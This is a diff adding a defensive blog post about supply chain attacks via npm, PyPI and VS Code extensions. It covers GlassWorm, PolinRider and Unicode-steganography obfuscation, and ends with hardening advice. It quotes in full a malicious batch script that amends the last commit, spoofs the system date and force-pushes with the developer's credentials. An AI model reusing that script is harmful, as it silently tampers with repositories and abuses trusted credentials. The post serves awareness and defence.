@@ -1,0 +1,111 @@
+---
+title: "npm, VS Code, and the Silent Supply Chain Takeover"
+description: "How malicious npm packages, PyPI libraries, and VS Code extensions are turning developer machines into attack vectors — and what you can do about it."
+date: 06-04-2026
+---
+
+## The Threat Is Already Inside
+
+Imagine the ones you trust the most becoming your biggest vulnerability. That's exactly what's happening right now in the developer ecosystem, with more than 143,000 npm packages, 10,000 PyPI packages, and more than 2,000 repositories declared malicious. It's no longer limited to compromised maintainers and packages — ongoing supply chain attacks are exploiting multiple points across the dependency chain. The whole dependency chain has become the supply chain.
+
+Currently just one malicious npm or PyPI package, or one compromised VS Code extension, is enough to turn an organization's infrastructure into an entry point. What's more alarming is that **developers aren't just victims — they're the vector.**
+
+In these campaigns, the developer's machine or local development environment is getting compromised to act as a distributor of malware. Authorities are even stating that malicious packages are installing RATs (Remote Access Trojans) on victim machines. They are not only compromised but have also become the distributors.
+
+## How It's Happening
+
+Nobody knows exactly how developers' machines are being compromised, but one thing is clear: whoever is doing this is smart enough to have multiple strategies.
+
+There are different scripts and different methodologies implementing the same things, sometimes in more refined ways. This variation could indicate either the evolution of a single campaign or multiple threat groups adopting similar tactics:
+
+- **Shai-Hulud** — self-propagating worm that stole tokens
+- **GlassWorm** — injected malicious code into Git repos in ways developers couldn't see, using multiple strategies to evade linters and reviewers, and using **Solana blockchain** as a C2 "dead drop" that's difficult to take down
+- **PolinRider** — compromised thousands of repos and is still active, deploying RATs for persistent access
+
+One thing is consistent across all these cases: the use of trusted channels — npm packages, dependencies, VS Code extensions — as delivery mechanisms. Once their scripts execute, they can:
+
+- Steal credentials
+- Mine cryptocurrency
+- Exfiltrate data
+- Create backdoors
+
+## What the Attack Looks Like
+
+In attacks like GlassWorm or PolinRider, you may find files like `temp_auto_push`:
+
+```text
+@echo off
+for /f "delims=" %%A in ('cmd /c "git log -1 --date=format-local:%%Y-%%m-%%d --format=%%cd"') do set LAST_COMMIT_DATE=%%A
+for /f "delims=" %%A in ('cmd /c "git log -1 --date=format-local:%%H:%%M:%%S --format=%%cd"') do set LAST_COMMIT_TIME=%%A
+for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%s"') do set LAST_COMMIT_TEXT=%%A
+for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%an"') do set USER_NAME=%%A
+for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%ae"') do set USER_EMAIL=%%A
+for /f "delims=" %%A in ('git rev-parse --abbrev-ref HEAD') do set CURRENT_BRANCH=%%A
+echo %LAST_COMMIT_DATE% %LAST_COMMIT_TIME%
+echo %LAST_COMMIT_TEXT%
+echo %USER_NAME% (%USER_EMAIL%)
+echo Branch: %CURRENT_BRANCH%
+set CURRENT_DATE=%date%
+set CURRENT_TIME=%time%
+date %LAST_COMMIT_DATE%
+time %LAST_COMMIT_TIME%
+echo Date temporarily changed to %LAST_COMMIT_DATE% %LAST_COMMIT_TIME%
+git config --local user.name %USER_NAME%
+git config --local user.email %USER_EMAIL%
+git add .
+git commit --amend -m "%LAST_COMMIT_TEXT%" --no-verify
+date %CURRENT_DATE%
+time %CURRENT_TIME%
+echo Date restored to %CURRENT_DATE% %CURRENT_TIME% and complete amend last commit!
+git push -uf origin %CURRENT_BRANCH% --no-verify
+@echo on
+```
+
+This script silently amends your last commit with malicious changes and force-pushes using your own credentials — making it look like nothing happened. It even temporarily changes the system date to match the original commit timestamp, so nothing looks out of place in the git log. Once they get that first push in, they have access to everything. And even if you remove the script later, they've already pushed their code — so next time they can use your credentials to push whatever they want.
+
+## The Obfuscation Techniques
+
+The malicious JavaScript payload is hidden using Unicode steganography. The code uses variation selectors (Unicode range `0xFE00–0xFE0F`) and tag block characters (`0xE0100–0xE01EF`) — invisible characters that carry encoded data:
+
+
+
+![GlassWorm obfuscated JS hidden in backticks — 9,125 selected characters](/images/image.png)
+
+Those empty backticks aren't empty — they contain 9,125 hidden characters carrying the full malicious payload. It executes silently at runtime while appearing as a blank string to any reviewer.
+
+![Malicious script concealed within whitespace characters in App.js](/images/image%201.png)
+
+This behavior has been linked to the **PolinRider** group, which is known for deploying RATs (Remote Access Trojans) to gain persistent access to compromised systems.
+
+![PolinRider RAT deployment evidence](/images/image%202.png)
+
+Another variant found in the wild — malicious code hidden inside backticks:
+
+![Malicious code hidden in backticks](/images/image%203.png)
+
+This payload is most commonly injected into:
+
+- `postcss.config.mjs`
+- `tailwind.config.js`
+- `eslint.config.mjs`
+- `next.config.mjs`
+- `babel.config.js`
+- `App.js` / `app.js`
+- Font files
+
+The same `global['!']` fingerprint has been found across **1,400+ repositories** on GitHub.
+
+## What You Can Do
+
+- Audit VS Code extensions regularly — remove anything unused or from untrusted publishers
+- Revoke and rotate tokens on GitHub, keep permissions minimal
+- Enable 2FA across GitHub, npm, and all dev-related accounts
+- Verify package names carefully to avoid typosquatting
+- Always commit your lock files (`package-lock.json` / `pnpm-lock.yaml`)
+- Review `preinstall`, `postinstall`, and `prepare` scripts before installing dependencies
+- Inspect `.git/hooks` for unexpected scripts
+- Use SSH for Git operations and sign commits with GPG
+- Run projects in isolated environments (containers or VMs)
+- Scan config files for hidden unicode characters — a file that looks like 5 lines but is 9KB is a red flag
+
+As a last resort, if compromise is suspected — wipe the system and rebuild from trusted sources.
